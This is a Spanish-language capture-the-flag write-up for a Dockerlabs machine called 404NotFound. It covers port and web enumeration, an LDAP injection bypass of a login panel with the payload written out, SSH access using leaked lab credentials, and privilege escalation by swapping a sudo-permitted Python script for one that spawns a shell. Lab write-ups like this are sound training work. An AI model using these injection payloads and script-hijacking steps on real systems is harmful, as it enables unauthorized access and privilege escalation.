
# Writeup Template: Maquina `[ 404NotFound ]`

- Tags: #404NotFound
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina 404NotFound](https://mega.nz/file/cCU02YzZ#UQgH3W1lHg-K8PbRRMokRwzP-hKpYI1ae6MWNAQkOj8)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x 404-not-found.zip
sudo bash auto_deploy.sh 404-not-found.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((ubuntuNoble))
```
---

## Enumeracion de [Servicio Web Principal]
Tenemos **hostDiscovery** asi que agregamos la siguiente linea a nuestro archivo: **( /etc/passwd )**
```bash
172.17.0.2 404-not-found.hl
```

Direccion url del servicio:
```bash
http://404-not-found.hl/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://404-not-found.hl/ # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 404-not-found.hl # No reporta nada critico
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://404-not-found.hl/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	No reporta nada critico

### Descubrimiento de Archivos
```bash
gobuster dir -u http://404-not-found.hl/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt,pl
```

- **Hallazgos**:
	No reporta nada critico

En esta seccion de la web:
```bash
http://404-not-found.hl/participar.html
```

Tenemos la siguiete cadena en **base64**
```bash
echo "UXVlIGhhY2VzPywgbWlyYSBlbiBsYSBVUkwu" | base64 -d
Que haces?, mira en la URL.
```

Revisando el codigo fuente tenemos una parte de codigo oculta pero no contiene nada critico
```bash
<!-- Elementos ocultos -->
    <div class="hidden">
        <p>¡Oh! Parece que encontraste algo... o tal vez no.</p>
    <p>Sigue buscando, tal vez te has perdido en la oscuridad...</p>
</div>
```

### Descubrimiento de Subdominios:
```bash
wfuzz -c --hl=9 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.404-not-found.hl" -u 172.17.0.2
```

Tenemos un subdominio:
```bash
000000097:   200        149 L    152 W      2023 Ch     "info"
```

Agregamos ese subdominio a nuestro archivo: **( /etc/hosts )**
```bash
172.17.0.2 info.404-not-found.hl
```

Ingresando a la url tenemos un panel de login para inicio de sesion:
```bash
http://info.404-not-found.hl/
```

Realizando descubrimiento de archivos:
```bash
gobuster dir -u http://info.404-not-found.hl/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,html,js,txt,sh
```

Obtenemos lo siguiente:
```bash
/index.html           (Status: 200) [Size: 2023]
/login.php            (Status: 200) [Size: 29]
/fail.html            (Status: 200) [Size: 1901]
```

Provaremos un ataque de SQLInjection en el panel de incio de sesion:

**Queries** probadas:
```bash
admin'
admin' or 1=1-- -
admin' or '1'='1-- -
admin' or sleep(5)-- -
```

Ninguna funciona y es porque en el codigo fuente indica que se esta usando **LDAP**
```bash
http://info.404-not-found.hl/index.html
```

Indica que usa **LDAP**
```bash
<!-- I believe this login works with LDAP -->
```

Ahora que sabemos que por detras esta **LDAP** de este recurso probaremos inyecciones para el panel de login
```bash
https://book.hacktricks.wiki/en/pentesting-web/ldap-injection.html?highlight=ldap%20injection#ldap-injection-2
```

## Explotacion de Vulnerabilidades
**LDAPInjection** probadas:
```bash
username: *
password: *

username: *)(&
password: *)(&
```

###### Evacion Panel Autentificacion:
```bash
user=*)(|(&
pass=pwd)
--> (&(user=*)(|(&)(pass=pwd))
```

Ahora estamos en el panel de administracion donde se puede gestionar el sistema:
```bash
http://info.404-not-found.hl/admin_panel_very_secret_impossibol.html
```

### Credenciales Filtradas
```bash
## Credenciales de Admin

Nombre de usuario: `404-page`
Contraseña: `not-found-page-secret`
```
---
### Vector de Ataque
Ahora que tenemos las credenciales filtradas y que sabemos que esta expuesto el servicio **ssh** nos intentaremos loguear por este servicio con estas credenciales.

### Intrusion
```bash
# Reverse shell o acceso inicial
ssh-keygen -R 172.17.0.2 && ssh 404-page@172.17.0.2
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
Usuarios del sistema:
```bash
root:x:0:0:root:/root:/bin/bash
404-page:x:1001:1001:404-page,,,:/home/404-page:/bin/bash
200-ok:x:1000:1000:200-ok,,,:/home/200-ok:/bin/bash
```

Listando los permisos del usuario tenemos lo siguiente
```bash
# Comandos clave ejecutados
sudo -l

User 404-page may run the following commands on 7f21bcd0d78f:
    (200-ok : 200-ok) /home/404-page/calculator.py # Tenemos una via potencial de migrar a este usurio
```
### Explotacion de Privilegios

###### Usuario `[ 404-page ]`:
Despues de ejecutar el script en python
```bash
sudo -u 200-ok /home/404-page/calculator.py
```

E intentar escapar comandos no tuvimos exito:
```bash
calculator> 10; whoami
Error: invalid syntax (<string>, line 1)
calculator> 10 && whoami
Error: invalid syntax (<string>, line 1)
calculator> 10 | whoami
Error: name 'whoami' is not defined
calculator> 10 | import os; os.system("whoami")
Error: invalid syntax (<string>, line 1)
calculator> 10 | echo $(whoami)
Error: invalid syntax (<string>, line 1)
calculator> 10 | cmd=whoami; $cmd
Error: invalid syntax (<string>, line 1)
```

**Nota** Sabiendo que el archivo no nos pertenece pero como esta en nuestro directorio y quiero pensar que los persmisos de nuestro directorio se inponen sobre los del archivo, Asi que intentaremos cambiarle el nombre al archivo a cualquier otro.
```bash
mv calculator.py natepaga.py
```

Ya que logramos cambiar el nombre, Crearemos el nuestro propio malicioso para que nos otrogue una shell como este usario.
```bash
touch calculator.py
chmod +x calculator.py
```

Su contenido es:
```python
#!/usr/bin/env python3

import os;
os.system("/bin/bash")
```

Explotamos el privilegio:
```bash
# Comando para escalar al usuario: ( 200-ok )
sudo -u 200-ok /home/404-page/calculator.py
```

###### Usuario `[ 200-ok ]`:
Listando los archivos para este usuario
```bash
-rw-r--r-- 1 root   root     20 Aug 19  2024 boss.txt
-rw-r--r-- 1 root   root     33 Aug 19  2024 user.txt
```

Tenemos dos archivos pero el que probamos como password para **root** es: **( boss.txt )** y su contenido:
```bash
What is rooteable
```

Probamos esta posible contrasena para **root**
```bash
su root # (rooteable  )
```

---

## Evidencia de Compromiso
Flag para **root**
```bash
-rw-r--r--  1 root root   33 Aug 19  2024 root.txt
root@7f21bcd0d78f:~# cat root.txt 
2424b2a3292e20c6e1ade39ed3e77629

```

```bash
# Captura de pantalla o output final
root@7f21bcd0d78f:~# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos que es **LDAP**
2. Aprendimos a aplicar inyecciones **LDAP**
3. Aprendimos a secuestrar archivos de otros usuario

## Recomendaciones de Seguridad
- Securizar el login para evitar **InyeccionesLDAP**
- Evitar otrorgar archivos con binarios peligrosos a otros usuarios del sistema.